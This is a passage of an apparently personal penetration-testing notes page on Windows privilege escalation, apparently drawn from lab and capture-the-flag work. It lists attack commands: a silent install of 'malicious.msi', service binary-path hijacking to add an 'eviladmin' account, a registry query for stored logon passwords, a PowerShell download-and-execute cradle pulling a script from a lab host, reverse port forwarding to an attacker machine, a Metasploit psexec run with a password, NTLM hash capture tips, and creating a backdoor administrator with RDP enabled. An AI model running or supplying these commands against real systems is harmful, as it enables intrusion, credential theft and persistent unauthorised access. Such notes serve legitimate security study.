<li>Reading: <code class="codehilite"><span class="err">​</span><span class="n">powershell</span> <span class="k">Get</span><span class="o">-</span><span class="n">Content</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;hm.txt&quot;</span> <span class="o">-</span><span class="n">Stream</span> <span class="ss">&quot;root.txt&quot;</span></code></li>
<li>Reading: <code class="codehilite"><span class="k">get</span><span class="o">-</span><span class="n">content</span> <span class="n">backup</span><span class="p">.</span><span class="n">zip</span> <span class="o">-</span><span class="n">stream</span> <span class="s1">&#39;pass&#39;</span></code></li>
<li>Reading: <code class="codehilite"><span class="n">streams</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">s</span></code> from sysinternals</li>
</ul>
<h2 id="msi">MSI<a class="headerlink" href="#msi" title="Permanent link">&para;</a></h2>
<h3 id="installing-msi">Installing MSI<a class="headerlink" href="#installing-msi" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">msiexec</span> <span class="o">/</span><span class="n">quiet</span> <span class="o">/</span><span class="n">qn</span> <span class="o">/</span><span class="n">i</span> <span class="n">malicious</span><span class="p">.</span><span class="n">msi</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">quiet</span> <span class="o">=</span> <span class="n">Suppress</span> <span class="k">any</span> <span class="n">messages</span> <span class="k">to</span> <span class="n">the</span> <span class="k">user</span> <span class="n">during</span> <span class="n">installation</span>
<span class="o">/</span><span class="n">qn</span> <span class="o">=</span> <span class="k">No</span> <span class="n">GUI</span>
<span class="o">/</span><span class="n">i</span> <span class="o">=</span> <span class="n">Regular</span> <span class="p">(</span><span class="n">vs</span><span class="p">.</span> <span class="n">administrative</span><span class="p">)</span> <span class="n">installation</span>
</pre></div>

<h2 id="services">Services<a class="headerlink" href="#services" title="Permanent link">&para;</a></h2>
<ul>
<li>Registry entries: <code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Services</span></code></li>
<li>View service properties: <code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> / <code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li>Restarting: <code class="codehilite"><span class="n">sc</span> <span class="n">stop</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> /  <code class="codehilite"><span class="n">net</span> <span class="n">stop</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span></code></li>
<li>Start: <code class="codehilite"><span class="n">sc</span> <span class="k">start</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> /  <code class="codehilite"><span class="n">net</span> <span class="k">start</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span></code></li>
<li>Service information: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Service</span><span class="err">​</span> <span class="err">​</span> <span class="ss">&quot;Ubiquiti UniFi Video&quot;</span><span class="err">​</span> <span class="o">|</span> <span class="n">fl</span> <span class="o">*</span></code></li>
<li>Restart PC: <code class="codehilite"><span class="n">shutdown</span> <span class="o">/</span><span class="n">r</span> <span class="o">/</span><span class="n">t</span> <span class="mi">0</span></code></li>
<li>Change binary path: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="ss">&quot;Vulnerable Service&quot;</span> <span class="n">binpath</span><span class="o">=</span> <span class="err">&quot;</span><span class="n">net</span> <span class="k">user</span> <span class="n">eviladmin</span> <span class="n">P4ssw0rd</span><span class="o">@</span> <span class="o">/</span><span class="k">add</span></code></li>
<li>Disable: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">disabled</span></code></li>
<li>Enable: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">demand</span></code></li>
<li>
<h2 id="auto-sc-config-servicename-start-auto">Auto: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">auto</span></code><a class="headerlink" href="#auto-sc-config-servicename-start-auto" title="Permanent link">&para;</a></h2>
</li>
</ul>
<h3 id="keep-alive">Keep alive<a class="headerlink" href="#keep-alive" title="Permanent link">&para;</a></h3>
<p>When a service starts in Windows operating systems, it must communicate with the <code class="codehilite"><span class="n">Service</span> <span class="n">Control</span> <span class="n">Manager</span></code>. If it's not, <code class="codehilite"><span class="n">Service</span> <span class="n">Control</span> <span class="n">Manager</span></code> will terminates the process.</p>
<h2 id="auto-save-password-to-powershell">Auto Save Password to PowerShell<a class="headerlink" href="#auto-save-password-to-powershell" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="ss">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="mi">2</span><span class="o">&gt;</span><span class="n">nul</span> <span class="o">|</span> <span class="n">findstr</span> <span class="ss">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">passwd</span> <span class="o">=</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="s1">&#39;Welcome1!&#39;</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="k">Force</span><span class="p">;</span>
<span class="err">$</span><span class="n">creds</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;administrator&#39;</span> <span class="err">$</span><span class="n">passwd</span><span class="p">)</span><span class="err">​</span>

<span class="k">Start</span><span class="o">-</span><span class="n">Process</span> <span class="o">-</span><span class="n">FilePath</span> <span class="ss">&quot;powershell&quot;</span> <span class="o">-</span><span class="n">argumentlist</span> <span class="ss">&quot;IEX(New-Object Net.webClient).downloadString(&#39;http://&lt;LAB IP&gt;/writeup&#39;)&quot;</span> <span class="o">-</span><span class="n">Credential</span> <span class="err">$</span><span class="n">creds</span>
</pre></div>

<h2 id="permissions">Permissions<a class="headerlink" href="#permissions" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>
</pre></div>

<h3 id="view-permisions">View Permisions<a class="headerlink" href="#view-permisions" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">cacls</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
</pre></div>

<h3 id="grant-permissions">Grant Permissions<a class="headerlink" href="#grant-permissions" title="Permanent link">&para;</a></h3>
<p><div class="codehilite"><pre><span></span><span class="n">cacls</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="o">/</span><span class="k">grant</span> <span class="n">Alfred</span><span class="p">:</span><span class="n">F</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">cacls</span> <span class="ss">&quot;c:\users\Administrator\Desktop\root.txt&quot;</span> <span class="o">/</span><span class="n">E</span> <span class="o">/</span><span class="n">P</span> <span class="n">Alfred</span><span class="p">:</span><span class="n">F</span>

<span class="n">cacls</span> <span class="n">Windows</span> <span class="n">utility</span> <span class="k">to</span> <span class="k">view</span><span class="o">/</span><span class="n">edit</span> <span class="n">file</span> <span class="n">permissions</span>
<span class="o">/</span><span class="n">E</span> <span class="k">to</span> <span class="n">edit</span> <span class="n">ACL</span>
<span class="o">/</span><span class="n">P</span> <span class="k">to</span> <span class="k">set</span> <span class="n">permissions</span>
<span class="n">Alfred</span><span class="p">:</span><span class="n">F</span> <span class="k">to</span> <span class="n">give</span> <span class="n">Alfred</span> <span class="k">full</span> <span class="n">control</span> <span class="k">of</span> <span class="n">the</span> <span class="n">file</span>
</pre></div></p>
<h2 id="ssh-from-windows-to-attacker-kali">SSH from Windows to Attacker (Kali)<a class="headerlink" href="#ssh-from-windows-to-attacker-kali" title="Permanent link">&para;</a></h2>
<h3 id="manual">Manual<a class="headerlink" href="#manual" title="Permanent link">&para;</a></h3>
<p>From Windows:</p>
<div class="codehilite"><pre><span></span><span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">l</span> <span class="n">root</span> <span class="o">-</span><span class="n">pw</span>  <span class="o">-</span><span class="n">R</span> <span class="mi">445</span><span class="p">:</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">445</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">8</span>
</pre></div>

<p>From Attacker:</p>
<div class="codehilite"><pre><span></span><span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span> <span class="o">|</span> <span class="n">grep</span> <span class="mi">445</span>
<span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span> <span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="ss">&quot;cmd.exe&quot;</span>
</pre></div>

<h3 id="metasploit">Metasploit<a class="headerlink" href="#metasploit" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">portfwd</span> <span class="k">add</span> <span class="o">-</span><span class="n">l</span> <span class="mi">445</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span> <span class="o">-</span><span class="n">r</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span>
 <span class="k">set</span> <span class="n">SMBDOMAIN</span> <span class="n">CHATTERBOX</span>
 <span class="k">set</span> <span class="n">SMBUSER</span> <span class="n">Administrators</span>
 <span class="k">set</span> <span class="n">SMBPASS</span> <span class="n">Welcome1</span><span class="o">!</span>
 <span class="k">set</span> <span class="n">RHOST</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">exploit</span>
</pre></div>

<h2 id="enumeration-tips">Enumeration Tips<a class="headerlink" href="#enumeration-tips" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Ref: <a href="https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/">https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/</a></p>
</blockquote>
<ul>
<li>Check the policies related to Network Access Control. Whether it can be bypassed or not.</li>
<li>Go for guest wifi. It could lead you to get inside the company network if it is not segregated.</li>
<li>Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords.</li>
<li>Check for misconfigurations in the systems as well as the network.</li>
<li>At the Domain level, always look for "Administrators" group members instead of going just for "Domain Admins". Reason being Builtin Administrators group is the superior one. Even "Domain Admins" group is also the member of administrators groups.</li>
<li>Look for User Rights Assignments in the GPOs. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights.</li>
<li>Most of the organizations use the same image for all of their deployments. Which means they use same local admin password. Always check if same local admin account is being used in whole domain.</li>
<li>Identify Admin Restrictions. (Logon Hours, LogonWorkstations) Decoys can be detected using this.</li>
<li>Use Responder to collect NTLM hashes.</li>
<li>Check <a href="https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx">SYSVOL</a> too.</li>
<li>ShareEnum to look for file shares.</li>
</ul>
<h2 id="add-user-and-enable-rdp">Add user and enable RDP<a class="headerlink" href="#add-user-and-enable-rdp" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">net</span> <span class="k">user</span> <span class="n">hacker</span> <span class="n">hacker</span> <span class="o">/</span><span class="k">add</span>
<span class="n">net</span> <span class="n">localgroup</span> <span class="o">/</span><span class="k">add</span> <span class="n">Administrators</span> <span class="n">hacker</span>
<span class="n">reg</span> <span class="k">add</span> <span class="ss">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> <span class="o">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">0</span> <span class="o">/</span><span class="n">f</span>
</pre></div>

<h1 id="references">References:<a class="headerlink" href="#references" title="Permanent link">&para;</a></h1>
<ul>
<li><a href="https://stackoverflow.com/questions/23074430/how-to-run-vbscript-from-command-line-without-cscript-wscript">Windows file association</a></li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../../network/y-Tools/" title="y Tools" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                y Tools
              </span>
            </div>
          </a>
        
        
          <a href="../active-directory/" title="Active Directory" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Active Directory
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
      
    
  </body>
</html>